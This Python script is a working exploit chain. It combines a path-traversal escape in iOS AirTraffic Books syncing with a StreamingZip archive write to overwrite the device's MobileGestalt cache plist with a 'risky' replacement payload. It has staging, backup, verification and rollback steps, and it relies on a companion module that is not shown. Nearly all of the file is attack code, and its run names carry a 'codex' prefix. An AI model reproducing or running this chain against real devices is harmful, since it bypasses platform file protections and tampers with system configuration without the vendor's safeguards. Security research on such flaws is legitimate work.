#!/usr/bin/env python3
"""Compose AirTraffic directory escape with StreamingZip leaf overwrite."""

from __future__ import annotations

import hashlib
import io
import json
import os
import plistlib
import secrets
import stat
import time
import zipfile
from pathlib import Path
from typing import Any

import direct_airtraffic_mgcache_replace as direct


STATE_PATH = direct.STATE_PATH
RUN_ROOT = direct.ROOT / "run" / "streamingzip-mgcache-replace"


def leaf_archive(payload: bytes) -> bytes:
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(
            direct.chain.zip_info("META-INF/", stat.S_IFDIR | 0o755), b""
        )
        archive.writestr(
            direct.chain.zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        archive.writestr(
            direct.chain.zip_info(direct.TARGET_LEAF, stat.S_IFREG | 0o600),
            payload,
        )
    return output.getvalue()


def wait_for_target(state: dict[str, Any], expected_size: int) -> dict[str, Any]:
    probe: dict[str, Any] = {}
    for _ in range(25):
        probe = direct.probe_target(state)
        size = (
            probe.get("operation", {})
            .get("fileInfo", {})
            .get("values", {})
            .get("st_size")
        )
        if direct.operation_ok(probe) and str(size) == str(expected_size):
            return probe
        time.sleep(0.1)
    return probe


def zip_write(state: dict[str, Any], archive: Path, label: str) -> dict[str, Any]:
    result = direct.mobile(
        state["udid"],
        "streamingzip-write-generated-mgcache",
        state["outer"],
        os.fspath(archive),
    )
    state.setdefault("streamingZipWrites", {})[label] = result
    direct.save(state)
    return result


def exact_export(
    state: dict[str, Any], expected: Path, label: str
) -> dict[str, Any]:
    direct.remove_export(state, state["verification"])
    move = direct.move(
        state,
        f"{label}-export",
        [(state["targetIdentifier"], state["verification"])],
    )
    verify = direct.verify_export(state, state["verification"], expected)
    return {"move": move, "verify": verify, "ok": direct.operation_ok(verify)}


def restore_original(
    state: dict[str, Any], original: Path, original_archive: Path
) -> dict[str, Any]:
    report: dict[str, Any] = {"attempted": True, "verified": False}
    backup = direct.verify_export(state, state["backup"], original)
    report["backup"] = backup
    if not direct.operation_ok(backup):
        report["error"] = "exact exported original is unavailable"
        return report
    direct.remove_export(state, state["verification"])
    report["writeOriginal"] = zip_write(
        state, original_archive, "rollback-original-first"
    )
    report["exact"] = exact_export(state, original, "rollback-original")
    if not report["exact"]["ok"]:
        report["error"] = "original StreamingZip write did not export exactly"
        return report
    wait_for_target(state, len(original.read_bytes()))
    report["writeOriginalFinal"] = zip_write(
        state, original_archive, "rollback-original-final"
    )
    final = direct.probe_target(state)
    report["finalProbe"] = final
    size = (
        final.get("operation", {})
        .get("fileInfo", {})
        .get("values", {})
        .get("st_size")
    )
    report["verified"] = bool(
        direct.operation_ok(final) and str(size) == str(len(original.read_bytes()))
    )
    return report


def run() -> dict[str, Any]:
    if STATE_PATH.exists():
        raise RuntimeError(f"unfinished state exists: {STATE_PATH}")
    original, _ = direct.plist_bytes(direct.EXPECTED_ORIGINAL)
    replacement, replacement_plist = direct.plist_bytes(direct.EXPECTED_REPLACEMENT)
    risky = direct.validate_risky(replacement_plist)
    if not risky["enabled"]:
        raise RuntimeError("Risky payload validation failed")
    udid = direct.chain.TRANSPORT.paired_coredevice_udid()
    preflight = direct.mobile(udid, "probe-afc")
    if not direct.operation_ok(preflight) or preflight["operation"].get(
        "booksSyncPlistPresent"
    ):
        raise RuntimeError("device/build/Books preflight failed")

    token = secrets.token_hex(10)
    run_dir = RUN_ROOT / token
    run_dir.mkdir(parents=True, exist_ok=False)
    source = f"codex-dir-src-24A435-{token}"
    outer = f"codex-dir-link-24A435-{token}"
    backup = f"codex-dir-recovered-24A435-original-{token}"
    verification = f"codex-dir-recovered-24A435-verify-{token}"
    discard = f"codex-dir-recovered-24A435-discard-{token}"
    alias = f"codex-mgcache-hardlink-24A435-{token}.plist"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    payload_identifier = f"../../{source}/payload"
    target_identifier = direct.posixpath.relpath(
        f"{direct.TARGET_DIRECTORY}/{direct.TARGET_LEAF}",
        direct.AIRLOCK_BOOK_ROOT,
    )
    stage_archive = direct.build_archive(replacement)
    initial_books = direct.books([link_identifier])
    stage_archive_path = run_dir / "stage.zip"
    initial_books_path = run_dir / "Books-initial.plist"
    replacement_archive = run_dir / "replacement-leaf.zip"
    original_archive = run_dir / "original-leaf.zip"
    stage_archive_path.write_bytes(stage_archive)
    initial_books_path.write_bytes(initial_books)
    replacement_archive.write_bytes(leaf_archive(replacement))
    original_archive.write_bytes(leaf_archive(original))

    state: dict[str, Any] = {
        "schema": 1,
        "test": "AirTrafficStreamingZipMobileGestaltReplace",
        "status": "local-artifacts-ready",
        "udid": udid,
        "token": token,
        "runDirectory": os.fspath(run_dir),
        "source": source,
        "outer": outer,
        "backup": backup,
        "verification": verification,
        "discard": discard,
        "alias": alias,
        "pivotLeaf": f"codex-dir-pivot-24A435-{token}",
        "linkIdentifier": link_identifier,
        "payloadIdentifier": payload_identifier,
        "targetIdentifier": target_identifier,
        "target": f"{direct.TARGET_DIRECTORY}/{direct.TARGET_LEAF}",
        "originalPath": os.fspath(direct.EXPECTED_ORIGINAL),
        "replacementPath": os.fspath(direct.EXPECTED_REPLACEMENT),
        "originalSHA256": hashlib.sha256(original).hexdigest(),
        "replacementSHA256": hashlib.sha256(replacement).hexdigest(),
        "replacementLength": len(replacement),
        "riskyValidation": risky,
        "preflight": preflight,
        "canonicalMutationAttempted": False,
        "commitVerified": False,
        "rollbackVerified": False,
    }
    direct.save(state)
    stage = direct.mobile(
        udid,
        "stage",
        source,
        outer,
        backup,
        os.fspath(stage_archive_path),
        os.fspath(initial_books_path),
    )
    state["stage"] = stage
    direct.save(state)
    if not direct.operation_ok(stage):
        raise RuntimeError("initial StreamingZip staging failed")

    placement = direct.move(
        state, "place-direct-link", [(link_identifier, outer)], restage=False
    )
    state["placement"] = placement
    placement_probe = direct.link_present(state)
    if not placement_probe.get("operation", {}).get("linkPresent"):
        state["placementRetry"] = direct.move(
            state,
            "place-direct-link-retry",
            [(link_identifier, outer)],
            restage=False,
        )
        placement_probe = direct.link_present(state)
    state["placementProbe"] = placement_probe
    direct.save(state)
    if not placement_probe.get("operation", {}).get("linkPresent"):
        direct.cleanup(state)
        raise RuntimeError("direct target-directory link did not land")

    failure: Exception | None = None
    try:
        state["canonicalMutationAttempted"] = True
        state["status"] = "exporting-original"
        direct.save(state)
        direct.move(
            state,
            "export-original",
            [(target_identifier, backup)],
        )
        live_original = run_dir / "live-original.plist"
        copied = direct.copy_export(state, backup, live_original)
        state["backupCopy"] = copied
        if not direct.operation_ok(copied) or live_original.read_bytes() != original:
            raise RuntimeError("live original backup was not exact")
        state["backupVerified"] = direct.verify_export(state, backup, live_original)
        if not direct.operation_ok(state["backupVerified"]):
            raise RuntimeError("live original backup verification failed")

        state["regeneratedBeforeWrite"] = wait_for_target(state, len(original))
        state["status"] = "streamingzip-replacement"
        direct.save(state)
        zip_write(state, replacement_archive, "replacement-first")
        first_exact = exact_export(state, direct.EXPECTED_REPLACEMENT, "replacement")
        state["firstExactReadback"] = first_exact
        if not first_exact["ok"]:
            raise RuntimeError("StreamingZip result did not match replacement bytes")

        # Exporting for verification lets MobileGestalt regenerate its original
        # cache.  Overwrite that regenerated leaf once more with the exact same
        # archive, then require replacement-sized metadata in place.
        wait_for_target(state, len(original))
        state["finalStreamingZip"] = zip_write(
            state, replacement_archive, "replacement-final"
        )
        final = direct.probe_target(state)
        state["finalProbe"] = final
        size = (
            final.get("operation", {})
            .get("fileInfo", {})
            .get("values", {})
            .get("st_size")
        )
        state["commitVerified"] = bool(
            direct.operation_ok(final) and str(size) == str(len(replacement))
        )
        if not state["commitVerified"]:
            raise RuntimeError("final in-place replacement metadata did not match")
        state["status"] = "commit-verified"
        direct.save(state)
    except Exception as error:
        failure = error
        state["commitError"] = f"{type(error).__name__}: {error}"
        state["status"] = "rolling-back"
        direct.save(state)
        live_original = run_dir / "live-original.plist"
        rollback = restore_original(
            state,
            live_original if live_original.is_file() else direct.EXPECTED_ORIGINAL,
            original_archive,
        )
        state["rollback"] = rollback
        state["rollbackVerified"] = rollback.get("verified") is True
        state["status"] = (
            "rollback-verified" if state["rollbackVerified"] else "rollback-incomplete"
        )
        direct.save(state)

    if failure is None or state.get("rollbackVerified"):
        cleanup = direct.cleanup(state)
    else:
        cleanup = {"ok": False, "preserved": "rollback not verified"}
        state["cleanup"] = cleanup
        direct.save(state)
    report = run_dir / "streamingzip-airtraffic-mgcache-replace.json"
    report.write_text(json.dumps(state, indent=2, sort_keys=True) + "\n")
    if direct.operation_ok(cleanup):
        STATE_PATH.unlink(missing_ok=True)
    if failure is not None:
        raise RuntimeError(
            f"{failure}; rollbackVerified={state.get('rollbackVerified')}; report={report}"
        )
    if not direct.operation_ok(cleanup):
        raise RuntimeError(f"commit verified but cleanup incomplete: {report}")
    return {
        "ok": True,
        "commitVerified": True,
        "replacementSHA256": state["replacementSHA256"],
        "replacementLength": state["replacementLength"],
        "cleanupVerified": True,
        "report": os.fspath(report),
    }


if __name__ == "__main__":
    try:
        print(json.dumps(run(), indent=2, sort_keys=True))
        raise SystemExit(0)
    except Exception as error:
        print(
            json.dumps(
                {"ok": False, "error": f"{type(error).__name__}: {error}"},
                indent=2,
                sort_keys=True,
            )
        )
        raise SystemExit(2)
